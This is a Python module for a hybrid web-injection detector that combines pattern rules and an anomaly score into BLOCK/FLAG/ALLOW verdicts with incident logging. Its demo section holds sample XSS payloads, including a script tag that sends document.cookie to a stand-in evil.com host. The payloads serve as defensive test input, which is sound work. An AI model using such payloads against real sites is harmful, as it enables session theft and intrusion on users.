"""
detector.py

The hybrid detector. Combines:
  1. Rule engine (rule_based_detector.scan) -- known attack patterns
  2. Anomaly detector (anomaly_detector.score) -- statistically unusual
     input, trained on benign data only, with no attack examples

...into one verdict, an attack type, and a severity rating. Every
BLOCK/FLAG is written to the incident log with a source identifier and
target field, so the output reads as an incident report.

No supervised classifier is used anywhere in this pipeline -- attack
type is derived from WHICH rule fired (for rule-based hits) or labelled
"Unclassified" (for anomaly-only hits, which by definition matched no
known pattern).
"""

import rule_based_detector as rules
import anomaly_detector as anomaly
import evidence_log as log

# ---------------------------------------------------------------------------
# Map rule names -> a human-readable attack type.
# ---------------------------------------------------------------------------
RULE_TO_ATTACK_TYPE = {
    "script_tag": "Script tag injection",
    "event_handler": "Event handler injection",
    "javascript_uri": "javascript: URI injection",
    "iframe_or_object": "Embedded frame/object injection",
    "svg_or_img_vector": "SVG/IMG vector injection",
    "html_entity_encoded": "HTML-entity encoded payload",
    "url_encoded_script": "URL-encoded payload",
    "eval_or_document": "Script execution / data access (eval, cookie, fetch)",
}

# Rules that indicate the payload can actually run script (as opposed to
# just being an encoded fragment) -- used for severity scoring.
EXECUTION_RULES = {
    "script_tag", "event_handler", "javascript_uri",
    "iframe_or_object", "svg_or_img_vector",
}
EXFILTRATION_RULE = "eval_or_document"


def classify_rule_hit(matched_rules: list) -> tuple:
    """Given the list of rule names that fired, return (attack_type, severity)."""
    # Prefer the most specific / highest-severity rule for the label.
    if EXFILTRATION_RULE in matched_rules:
        attack_type = RULE_TO_ATTACK_TYPE[EXFILTRATION_RULE]
        severity = "High"  # attempts to read cookies / call out to a server
    elif any(r in EXECUTION_RULES for r in matched_rules):
        exec_rule = next(r for r in matched_rules if r in EXECUTION_RULES)
        attack_type = RULE_TO_ATTACK_TYPE[exec_rule]
        severity = "Medium"  # executes script, no confirmed exfiltration
    else:
        # Only encoding-related rules matched -- suspicious but not
        # confirmed to execute anything as written.
        enc_rule = matched_rules[0]
        attack_type = RULE_TO_ATTACK_TYPE.get(enc_rule, "Encoded/obfuscated payload")
        severity = "Low"
    return attack_type, severity


def anomaly_severity(anomaly_score: float) -> str:
    """Bucket the anomaly score into a severity. More negative = more
    anomalous. Thresholds are a starting rubric -- tune on real data."""
    if anomaly_score < -0.10:
        return "High"
    elif anomaly_score < -0.03:
        return "Medium"
    return "Low"


def detect(
    raw_input: str,
    source_id: str,
    target_field: str,
    anomaly_model=None,
) -> dict:
    """
    Run the full hybrid pipeline on one piece of input.

    Returns a result dict and, for BLOCK/FLAG, writes an incident record.
    """
    rule_result = rules.scan(raw_input)
    anomaly_result = anomaly.score(raw_input, model=anomaly_model)

    matched_rules = rule_result["matched_rules"]
    is_anomaly = anomaly_result["is_anomaly"]
    anomaly_score = anomaly_result["anomaly_score"]

    if matched_rules:
        # A rule hit is a confirmed known pattern -> BLOCK. This decision
        # doesn't depend on what the anomaly detector thinks, so the reason
        # is "rule match" regardless of whether it also flagged the input --
        # the anomaly_score is still recorded, just not cited as the cause.
        verdict = "BLOCK"
        attack_type, severity = classify_rule_hit(matched_rules)
        reason = "rule:" + ",".join(matched_rules)
    elif is_anomaly:
        # No known pattern matched, but it's statistically unusual
        # compared to normal input -> FLAG for review.
        verdict = "FLAG"
        attack_type = "Unclassified (statistical anomaly)"
        severity = anomaly_severity(anomaly_score)
        reason = "anomaly_only"
    else:
        verdict = "ALLOW"
        attack_type = None
        severity = None
        reason = "clean"

    result = {
        "verdict": verdict,
        "attack_type": attack_type,
        "severity": severity,
        "reason": reason,
        "matched_rules": matched_rules,
        "anomaly_score": anomaly_score,
    }

    if verdict in ("BLOCK", "FLAG"):
        log.log_incident(
            source_id=source_id,
            target_field=target_field,
            raw_input=raw_input,
            verdict=verdict,
            reason=reason,
            attack_type=attack_type,
            severity=severity,
            anomaly_score=anomaly_score,
        )

    return result


if __name__ == "__main__":
    import sys

    model = anomaly.load_model()

    if len(sys.argv) > 1:
        # Ad-hoc single-input mode: python detector.py "some input"
        text = " ".join(sys.argv[1:])
        result = detect(text, source_id="cli", target_field="cli", anomaly_model=model)
        atk = result["attack_type"] or "-"
        sev = result["severity"] or "-"
        print(f"input:    {text!r}")
        print(f"verdict:  {result['verdict']}")
        print(f"type:     {atk}")
        print(f"severity: {sev}")
        print(f"reason:   {result['reason']}")
        print(f"anomaly_score: {result['anomaly_score']:+.3f}")
    else:
        # Simulated incoming submissions, each with a source IP and target field --
        # this is the "traffic" the demo will show being processed.
        samples = [
            ("203.0.113.7", "comment", "Great article, thanks for sharing!"),
            ("198.51.100.23", "comment", "<img src=x onerror=alert(1)>"),
            ("198.51.100.23", "search", "<script>fetch('http://evil.com/?c='+document.cookie)</script>"),
            ("192.0.2.55", "username", "';alert(String.fromCharCode(88,83,83))//"),
        ]

        print(f"{'SOURCE':<22} {'FIELD':<10} {'VERDICT':<7} {'ATTACK TYPE':<45} {'SEV':<7} INPUT")
        for source_id, field, text in samples:
            result = detect(text, source_id, field, anomaly_model=model)
            atk = result["attack_type"] or "-"
            sev = result["severity"] or "-"
            print(f"{source_id:<22} {field:<10} {result['verdict']:<7} {atk:<45} {sev:<7} {text[:40]!r}")

        print("\nIncident log after this run:\n")
        log.print_incident_blocks()
